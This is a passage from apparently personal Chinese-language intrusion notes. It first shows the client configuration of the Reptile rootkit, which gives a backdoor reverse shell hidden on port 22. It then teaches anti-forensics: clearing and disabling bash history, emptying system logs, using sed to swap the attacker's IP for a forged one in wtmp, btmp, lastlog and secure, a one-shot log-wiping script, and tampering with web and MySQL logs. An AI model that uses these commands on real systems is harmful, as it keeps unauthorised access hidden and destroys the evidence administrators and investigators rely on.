cd reptile_love
```

<img src=".\图片\Snipaste_2022-12-27_15-16-00.png" alt="Snipaste_2022-12-27_15-16-00" style="zoom:80%;" />

实测使用 `ls -al` 也显示不出来

#### 客户端使用

客户端安装，我就一台服务器作为了被控端，尝试了不能同时作为**被控端**和**控制端**，会安装失败

```
cd Reptile-2.0/
./setup.sh client
```

设置连接配置

```
set LHOST x.x.x.x			#接受shell地址
set LPORT xxxx				#接受shell端口
set SRCHOST x.x.x.x		#接受shell地址
set SRCPORT 666				#前面后门配置中的SRC port
set RHOST x.x.x.x			#目标地址
set RPORT 22					#远程端口(仅适用于TCP/UDP) 这里选择22模拟ssh
set PROT TCP 					#发送数据包的协议(ICMP/TCP/UDP)
set PASS s3cr3t 			#后门密码(前面设置的)
set TOKEN hax0r 			#后门Token
run
```

可以反弹个**shell会话**，且把它隐藏到了22端口，可以传文件等等

<img src=".\图片\1668062022223-64d84f36-7e11-4f1c-ab1b-70cff9d805ae.png" alt="1668062022223-64d84f36-7e11-4f1c-ab1b-70cff9d805ae" style="zoom:67%;" />

<img src=".\图片\1668062039478-b41e8b5f-9168-4153-bcc8-40d2721d3a7d.png" alt="1668062039478-b41e8b5f-9168-4153-bcc8-40d2721d3a7d" style="zoom:67%;" />

<img src=".\图片\1668062935375-32c77ff5-faad-4be4-9eda-045c7d5ca0dc.png" alt="1668062935375-32c77ff5-faad-4be4-9eda-045c7d5ca0dc" style="zoom:80%;" />

## Linux入侵痕迹清理

（ **#管理员 $普通用户 / 表示 根目录 ~表示当前用户家目录**）

### **清除history历史命令记录**

查看历史操作命令

```
history
```

history 显示**内存和 ~/.bash_history 中的所有内容**；
内存中的内容并没有立刻写入 ~/.bash_history ，只有当当前shell关闭时才会将内存内容写入shell

（1）编辑 history 记录文件，删除部分不想被保存的历史命令

```
vim ~/.bash_history
```

（2）清除当前用户的history命令记录⭐

```
history -c  # 删除内存中的所有命令历史
history -r  # 删除当前会话历史记录
```

### ⭐不记录history历史命令

（1）通过修改配置文件/etc/profile，使系统不再保存命令记录

```
HISTSIZE=0
```

```
└─# echo $HISTSIZE                                                                                         
1000
                                                                                                           └─# HISTSIZE=0    
                                                                                                            
└─# echo $HISTSIZE
1                                                                                                                                                              
└─# HISTSIZE=1000                                                                                                                                                               
└─# echo $HISTSIZE           
1000
                                                                                                              └─# history
  213  HISTSIZE=1000
```

（2）登录后执行下面命令,不记录历史命令(.bash_history)

```
unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; export HISTFILE=/dev/null; export HISTSIZE=0; export HISTFILESIZE=0
```

### **清除系统日志痕迹**

Linux 系统存在多种日志文件，来记录系统运行过程中产生的日志

```
/var/run/utmp        #记录现在登入的用户，使用w,who,users等命令查看
/var/log/wtmp        #记录用户所有的登入和登出，使用last命令查看
/var/log/lastlog     #记录每一个用户最后登入时间，使用lastlog命令查看
/var/log/btmp        #记录所有登录失败信息，使用lastb命令查看
/var/log/auth.log    #需要身份确认的操作
/var/log/secure      #记录安全相关的日志信息
/var/log/maillog     #记录邮件相关的日志信息
/var/log/message     #记录系统启动后的信息和错误日志
/var/log/cron        #记录定时任务相关的日志信息
/var/log/spooler     #记录UUCP和news设备相关的日志信息
/var/log/boot.log    #记录守护进程启动和停止相关的日志消息
```

#### （1）清空日志文件

以下几种方式：

```
cat /dev/null > filename
echo "" > filename
echo > filename
: > filename
> filename
```

<img src=".\图片\Snipaste_2022-12-27_15-50-41.png" alt="Snipaste_2022-12-27_15-50-41" style="zoom:80%;" />

#### ⭐（2）替换/删除部分日志

日志文件全部被清空，太容易被管理员察觉了，如果只是删除或替换部分关键日志信息，那么就可以完美隐藏攻击痕迹。

替换：

```
# 192.168.100.101为攻击者IP，10.0.0.55为伪造IP，-i编辑文件
sed 's/192.168.100.101/10.0.0.55/g' -i /var/log/btmp*
sed 's/192.168.100.101/10.0.0.55/g' -i /var/log/lastlog
sed 's/192.168.100.101/10.0.0.55/g' -i /var/log/wtmp
sed 's/192.168.100.101/10.0.0.55/g' -i secure
sed 's/192.168.100.101/10.0.0.55/g' -i /var/log/utmp
```

删除：

```
# 删除所有匹配到字符串的行,比如以当天日期或者自己的登录ip
sed  -i '/自己的ip/'d  /var/log/messages
sed  -i '/当天日期/'d  filename
```

### 一键清除history和系统日志脚本

```
#!/usr/bin/bash
echo > /var/log/syslog
echo > /var/log/messages
echo > /var/log/httpd/access_log
echo > /var/log/httpd/error_log
echo > /var/log/xferlog
echo > /var/log/secure
echo > /var/log/auth.log
echo > /var/log/user.log
echo > /var/log/wtmp
echo > /var/log/lastlog
echo > /var/log/btmp
echo > /var/run/utmp
rm ~/./bash_history
history -c
```

<img src=".\图片\Snipaste_2022-12-27_15-53-56.png" alt="Snipaste_2022-12-27_15-53-56" style="zoom:80%;" />

### 清除web日志痕迹

web日志同样可以使用sed进行伪造，例如apache日志、MySQL日志、php日志

```
sed 's/192.168.100.101/10.0.0.55/g' –i /var/log/apache/access.log
sed 's/192.168.100.101/10.0.0.55/g' –i /var/log/apache/error_log

sed 's/192.168.100.101/10.0.0.55/g' –i /var/log/mysql/mysql_error.log
sed 's/192.168.100.101/10.0.0.55/g' –i /var/log/mysql/mysql_slow.log

sed 's/192.168.100.101/192.168.1.4/g' –i /var/log/apache/php_error.log
```

清除部分相关日志

```
# 使用grep -v来把我们的相关信息删除
cat /var/log/nginx/access.log | grep -v evil.php > tmp.log
# 把修改过的日志覆盖到原日志文件
cat tmp.log > /var/log/nginx/access.log/
```

